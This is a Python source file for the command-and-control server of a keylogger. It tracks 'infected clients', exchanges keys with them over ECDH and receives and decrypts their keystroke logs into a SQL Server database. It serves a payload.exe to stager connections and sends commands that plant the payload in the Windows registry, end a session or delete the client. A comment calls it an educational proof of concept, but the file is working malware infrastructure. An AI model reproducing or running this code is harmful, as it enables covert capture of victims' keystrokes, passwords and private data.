import base64
import os
import socket
import sys
import threading
import control_database
from cryptography import fernet  # Needs to be installed.
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.hazmat.primitives.serialization import PublicFormat
from cryptography.hazmat.primitives import serialization
import datetime
import time
import json


# *** Notes ***
# Commands are being sent to client in the clear.
# This is only a proof of concept and for educational purposes. Please do not use with mal-intent.
# The error with base 10 might be random due to the cycle of sending

# *** Fix ***
# Modules that us ODBC to read/write client info.

# *** Add ***
# Add Json usage when user does not select to import a custom DB.

date_format = '%Y-%m-%d %H:%M:%S'


class ControlCenter:

    server_ip = socket.gethostname()
    server_ip = socket.gethostbyname(server_ip)  # Gets IP address of local machine.
    server_port = 11111
    connections = 0
    header_size = 1024
    use_database = False
    kill_switch_command = 'XXX'  # Kill switch to kill program from server.
    window_registry_command = 'WRG'
    self_destruct_command = 'DST' # Will self destruct the file.
    database = None
    database_info = None
    clients = list()  # List that will hold all clients.
    list_all_clients = 'L'  # Command to list the infected clients
    commands_description = [f'[{kill_switch_command}] : TO KILL CLIENT SESSION', f'[{list_all_clients}] : LIST ALL CLIENTS',
                f'[{window_registry_command}] : SET PAYLOAD INTO WINDOWS REGISTRY',
                            f'[{self_destruct_command}] : DELETES CLIENT PROGRAM OFF SYSTEM']
    commands = ['XXX', 'WRG', 'DST']  # Actual command codes.

    def __init__(self):
        self.connect_database()
        pass

    def time_stamp(self):
        time_stamp = datetime.datetime.utcnow().isoformat(sep=" ", timespec='milliseconds')
        return time_stamp

    def connect_database(self):
        connection_code = None
        used_cookies = False
        choice = input(f'DO YOU WANT TO CONNECT A CUSTOM DATABASE? [Y]:[N] ').upper()
        self.database_cookie_read()
        if choice == 'Y':
            while connection_code != 0 and choice != 'N':
                if self.database_info is None:
                    help = input('DO YOU WANT TO PRINT THE INSTRUCTIONS ON SETTING UP A DATABASE? [Y]:[N] ').upper()
                    if help == 'Y':
                        print(
                            'CREATE A DATABASE AND NAME IT [keylogger]. '
                            'THE PROGRAM WILL THEN INITIALIZE THE TABLES IN THE DATABASE.\n'
                            'YOU CAN FIND THE DRIVER INFO IN WINDOWS BY GOING TO: '
                            'Administrative tools>ODBC Data Sources (32-bit)')

                    odbc_driver = input(f'ENTER DRIVER (I.E. ODBC Driver 17 for SQL Server;): ')
                    odbc_server = input(f'ENTER SERVER (I.E. DESKTOP - UCFQ6S6\SQLEXPRESS;): ')
                    odbc_database = input(f'ENTER DATABASE NAME (I.E key_logger;): ')
                    self.database_info = f"""
                                    Driver={{{odbc_driver}}};
                                    Server={odbc_server};
                                    Database={odbc_database};
                                    Trusted_Connection=yes;
                                    """
                else:
                    used_cookies = True

                self.database = control_database.Database()
                connection_code = self.database.connect_custom(self.database_info)

                if connection_code == 0:  # If database connected successfully.
                    use_database = True
                    print(f'CONNECTED TO: [{self.database_name()}]')
                    if not used_cookies:
                        self.database_cookie_write()

                else:
                    choice = input('CONNECTION FAILED. DO YOU WANT TO TRY AGAIN? [Y]:[N]').upper()
                    self.database_info = None
                    while choice != 'Y' and choice != 'N':
                        choice = input('PLEASE ONLY ENTER [Y]:[N]').upper()

        elif choice == 'N':
            print('SORRY THIS FEATURE IS NOT CURRENTLY SUPPORTED')
            exit(0)
        else:
            choice = input('PLEASE ENTER ONLY [Y]-YES OR [N]-NO').upper()

    def database_name(self):
        if self.database_info is None:
            return
        line = self.database_info.splitlines()
        database = line[3]
        database = database.lstrip()
        database = database[9:-1]
        return database


    def database_cookie_write(self):
        choice = None
        while choice != 'Y' and choice != 'N':
            choice = input('DO YOU WANT TO SAVE THIS DATABASE INFO? [Y]:[N]').upper()
            if choice == 'Y':
                database_cookie = open('database_cookies.txt', 'w')
                database_cookie.write(self.database_info)  # Creates cookie to save database info
                database_cookie.close()
            elif choice == 'N':
                return
            else:
                print('PLEASE ENTER CORRECT CHOICE')

    def database_cookie_read(self):
        try:  # If DB cookies were found ask user if he wishes to load that info
            file_handle = open('database_cookies.txt', 'r')  # Reads for a database cookie
            self.database_info = file_handle.read()
            choice = input(f'A PREVIOUS CONNECTION WAS FOUND: \t{self.database_info}'
                           f'\nDO YOU WANT TO LOAD THIS DATABASE INTO THE SESSION [Y]:[N]').upper()
            if choice == 'Y':
                file_handle.close()
                return 0
            else:
                file_handle.close()
                self.database_info = None
                return 1
        except FileNotFoundError:  # If no cookies were found.
            return 1


    def control_station(self):  # Provides function of listing clients and sending commands.
        while True:
            command = input('TYPE help FOR OPTIONS. >').upper()  # Gets command input.
            if command == self.list_all_clients:
                self.list_clients()
            elif command == self.kill_switch_command:
                target = self.send_command(command)
            elif command == self.window_registry_command:
                target = self.send_command(command)
            elif command == self.self_destruct_command:
                target = self.send_command(command)
            elif command == 'HELP':
                self.list_commands()
            else:
                print('INVALID COMMAND')

    def list_commands(self):
        for command in self.commands_description:
            print(command)

    def send_command(self, command):  # Handle for sending commands to client.
        if not self.clients:  # If no client exists.
            print('NO TARGETS EXIST.')
        if command == self.kill_switch_command:
            self.list_clients()
            target = input(f'SELECT TARGET TO SEND COMMAND\n>')
            self.send(target, command)  # Sends array index -1 with the chosen command.
            print(f'COMMAND SENT to [{self.clients[int(target)-1][0]}]')
            client_id = self.database.get_id_from_ip(self.clients[int(target)-1][0][0])
            self.database.log_command(client_id, command)
            self.clients.remove(self.clients[int(target) - 1])
        elif command == self.window_registry_command:
            self.list_clients()
            target = input(f'SELECT TARGET TO SEND COMMAND\n>')
            self.send(target, command)  # Sends array index -1 with the chosen command.
            print(f'COMMAND SENT to [{self.clients[int(target)-1][0]}]')
            client_id = self.database.get_id_from_ip(self.clients[int(target) - 1][0][0])
            self.database.log_command(client_id, command)
        elif command == self.self_destruct_command:
            self.list_clients()
            target = input(f'SELECT TARGET TO SEND COMMAND\n>')
            self.send(target, command)  # Sends array index -1 with the chosen command
            client_id = self.database.get_id_from_ip(self.clients[int(target) - 1][0][0])
            self.database.log_command(client_id, command)
            self.clients.remove(self.clients[int(target) - 1])

        return target

    def send(self, target, command):  # Sends data to client.
        command_size = str(len(command)).encode('utf-8')  # Obtains byte size.
        command_size += b' ' * (self.header_size - len(command_size))  # Pads it with header.
        self.clients[int(target) - 1][1].send(command_size)  # Sends the command size.
        time.sleep(.10)
        self.clients[int(target) - 1][1].send(command.encode('utf-8'))  # Sends the command.

    def list_clients(self):  # List all connected clients.
        count = 1
        if not self.clients:  # If no clients connected.
            print('NO CONNECTED CLIENTS.')
            return
        for client in self.clients:  # Iterates through list.
            print(f"{count}: {client[0]}")
            count = count + 1

    def start_server(self):  # Starts the server system.
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.server_ip, self.server_port))
        server_socket.listen(5)
        print(f"SERVER LISTENING AT {self.server_ip}:{self.server_port}")
        control_station = threading.Thread(target=control_center.control_station)
        control_station.start()
        while True:
            client, client_address = server_socket.accept()
            connection = threading.Thread(target=self.handle_connection, args=(client, client_address))
            connection.start()

    def handle_connection(self, client, client_address):  # Handles the new connection from client.
        # is_loader()  # Will check if the connection is from a loader.
        time_stamp = self.time_stamp()
        self.connections = self.connections + 1
        client_id = self.database.add_client(client_address)
        print(f'[{time_stamp}] RECEIVED CONNECTION FROM CLIENT#: {client_id}')
        self.database.log_connection(client_id, 1)  # Logs user in
        self.clients.append((client_address, client))
        Client(client, client_address, client_id)
        self.database.log_connection(client_id, 0)  # Logs user out

control_center = ControlCenter()

class Client(ControlCenter):  # Client object for processing clients.

    date_format = '%Y-%m-%d %H:%M:%S'
    local_flag = 'LOC'
    loader_command = 'STG'
    payload_command = 'PLD'
    local_log_command = 'LCL'

    def __init__(self, client, client_address, client_id):
        self.client_id = client_id
        self.client = client  # Client socket.
        self.client_address = client_address  # Client IP, PORT
        self.client_connected = True  # Flag to signal connection.
        self.key = None
        self.local_key = None # Key used to decrypt local log data.
        self.key_exchange()
        # ControlCenter.function()
        self.crypt_obj = fernet.Fernet(self.key)
        self.local_crypt_obj = None
        self.check_connection_type() # Should check what kind of connection is being made to server.

    def listen_for_log(self):  # Listens for log payload.
        while self.client_connected:  # While client is connected
            try:
                log_payload = self.receive()
                self.proccess_log(log_payload)
            except ValueError:  # If client disconnects or becomes unreachable.
                time_stamp = self.time_stamp()
                print(f"[{time_stamp}] CLIENT DISCONNECTED FROM: {self.client_address}")
                self.client_connected = False
        #  self.process_log(data.decode('utf-8'))
        #  Decrypt
        #  Place in storage

    def check_connection_type(self):  # Talks to client to check if it is a stager program or a payload program.
        connection_type = self.receive()
        connection_type = self.crypt_obj.decrypt(connection_type).decode()
        if connection_type == self.payload_command:
            confirmation = self.crypt_obj.encrypt(self.payload_command.encode())
            self.send(confirmation)  # Sends confirmation
            self.listen_for_log()  # Start listening for logs from client.
        elif connection_type == self.loader_command:
            print('LOADER CONNECTED')
            confirmation = self.crypt_obj.encrypt(self.loader_command.encode())
            self.send(confirmation)
            self.process_loader()

    def receive(self):  # Receives data from client
        try:
            incoming_payload_len = self.client.recv(control_center.header_size)  # Gets payload size.
            time.sleep(.10)
            payload = self.client.recv(int(incoming_payload_len.decode('utf-8'))) # Gets payload
            return payload
        except ConnectionResetError:  # If client disconnects while listening.
            time_stamp = self.time_stamp()
            control_center.clients.remove(self.client_address)
            self.client_connected = False  # Client is no longer connected.
            return

    def proccess_log(self, data):  # Writes log to output.
        if not data:
            return

        if data.decode() in control_center.commands:  # If data is in command list its the client sending confirmation.
            print(f'[{data.decode()}] COMMAND CONFIRMATION RECEIVED')
            return

        data = self.crypt_obj.decrypt(data)  #
        data = data.decode('utf-8')
        if data == self.local_log_command:
            self.process_local_log()
            return
        control_center.database.write_log(self.client_id, data)
        print(data)

# Issue is that client is sending log line by line.

    def process_local_log(self):  # Procesess the local log data it receives from client.
        temp_local_log_enc = open('temp_log_enc.txt', 'w')  # File that will hold encrypted log.
        temp_local_log_dec = open('temp_log_dec.txt', 'w')  # File that will hold decrypted log.
        self.local_key = self.receive()  # Receives encrypted local key.
        self.local_key = self.crypt_obj.decrypt(self.local_key)  # Decrypts the local key using the shared key.
        print(f'LOCAL KEY = {self.local_key.decode("utf-8")}')
        self.local_crypt_obj = fernet.Fernet(self.local_key)  # Creates local encryption object.
        data = self.receive()  # Receives encrypted local log
        temp_local_log_enc.write(data.decode('utf-8'))
        temp_local_log_enc.close()  # Closes it for writing.
        temp_local_log_enc = open('temp_log_enc.txt', 'r')  # Opens for reading.
        lines = temp_local_log_enc.readlines()
        for line in lines:  # Goes line by line and decrypts each.
            data = self.local_crypt_obj.decrypt(line.encode('utf-8')) # Decrypts local log using local key.
            temp_local_log_dec.write(data.decode('utf-8'))
            print(f'LOCAL DATA = {data.decode()}')
            control_center.database.write_log(self.client_id, data.decode())  # Writes each line of log to DB.
        # Closes temp files below.
        temp_local_log_enc.close()
        temp_local_log_dec.close()
        os.remove('temp_log_enc.txt')
        os.remove('temp_log_dec.txt')

    def send(self, data):  # Sends data to client.
        send_size = str(sys.getsizeof(data)).encode('utf-8')  # Obtains byte size.
        send_size += b' ' * (self.header_size - len(send_size))  # Pads it with header.
        self.client.send(send_size)  # Sends the command size.
        time.sleep(.10)
        if type(data) != bytes:
            data = data.encode()
        self.client.send(data)  # Sends the command.

    def key_exchange(self):
        private_key = ec.generate_private_key(ec.SECP384R1())
        public_key = private_key.public_key()
        client_public_key = self.receive()
        client_public_key = serialization.load_pem_public_key(client_public_key)
        self.send(public_key.public_bytes(encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo))
        shared_key = private_key.exchange(ec.ECDH(), client_public_key)
        derived_key = HKDF(
            info=None,
            length=32,
            salt=None,
            algorithm=hashes.SHA256()
        ).derive(shared_key)
        derived_key = base64.urlsafe_b64encode(derived_key)
        self.key = derived_key
        print(f'CLIENT KEY = {derived_key.decode()}')

    def process_loader(self):
# Should ensure that it has not received connection from this location before. And if it has it should blacklist the ip.
        file = open('payload.exe', 'rb')
        file_content = file.read()
        self.send(file_content)
        file.close()

    def check_for_command(self):  # Independent thread that reads commands from
        pass


control_center.start_server()
